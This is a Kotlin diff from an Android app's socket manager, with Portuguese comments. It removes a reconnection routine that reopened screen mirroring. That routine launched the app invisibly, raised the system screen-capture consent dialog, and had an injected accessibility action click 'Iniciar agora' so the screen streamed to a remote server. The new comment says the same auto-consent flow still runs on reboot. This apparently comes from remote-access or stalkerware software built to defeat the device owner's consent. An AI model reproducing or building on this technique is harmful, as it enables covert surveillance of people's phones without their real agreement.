@@ -376,41 +376,13 @@ object SocketManager {
                             }
                         }.start()
 
-                        // RECONEXÃO (casa de segurança): se a conexão caiu e voltou e o
-                        // espelhamento NÃO está ativo, reexibe o modal interno de
-                        // consentimento para restabelecê-lo. Não dispara na 1ª conexão.
-                        val ehReconexao = jaConectouUmaVez
+                        // [MODAL SÓ NO REBOOT] Antes, ao reconectar o socket com o
+                        // espelhamento inativo, reexibíamos o modal de consentimento.
+                        // A pedido, o modal de consentimento agora aparece SOMENTE
+                        // quando o dispositivo é REINICIADO (BootReceiver ->
+                        // MainActivity AUTO_BOOT_REANIMAR). Em reconexão de socket
+                        // apenas marcamos que já conectou; NÃO reabrimos o modal.
                         jaConectouUmaVez = true
-                        // (item 2) SÓ revalida o espelhamento se ele ESTAVA ATIVO antes
-                        // da queda (houve sessão real). Em reconexão ociosa — socket
-                        // volta mas nunca houve espelhamento — NÃO reabre o modal
-                        // (evita o loop do consentimento).
-                        if (ehReconexao && !ScreenCaptureService.isRunning
-                            && ScreenCaptureService.espelhamentoJaAtivou
-                            && !ScreenCaptureService.revalidacaoConsentimentoPendente) {
-                            try {
-                                val ctx = appContext ?: MyAccessibilityService.instance
-                                if (ctx != null) {
-                                    // Disparo único (anti-loop): marca pendente para
-                                    // não reabrir o modal em reconexões seguidas.
-                                    ScreenCaptureService.revalidacaoConsentimentoPendente = true
-                                    val intent = Intent(ctx, MainActivity::class.java).apply {
-                                        // Igual ao desbloqueio: caminho HEADLESS (janela
-                                        // transparente) → modal de consentimento do SISTEMA
-                                        // sobre a tela inicial, sem abrir o app. Inject clica
-                                        // "Iniciar agora", o modal some e o espelhamento
-                                        // continua por Socket.IO + HTTP.
-                                        putExtra("AUTO_BOOT_REANIMAR", true)
-                                        putExtra(MainActivity.EXTRA_REVALIDAR_ESPELHAMENTO, true)
-                                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
-                                    }
-                                    ctx.startActivity(intent)
-                                    emitLog("[RECONEXAO] Socket reconectou e captura inativa — reexibindo modal de consentimento do espelhamento.")
-                                }
-                            } catch (e: Exception) {
-                                emitLog("[RECONEXAO ERRO] Falha ao reexibir modal: ${e.message}")
-                            }
-                        }
                     }
                     on(Socket.EVENT_DISCONNECT) {
                         Log.d(TAG, "Socket.io Desconectado")
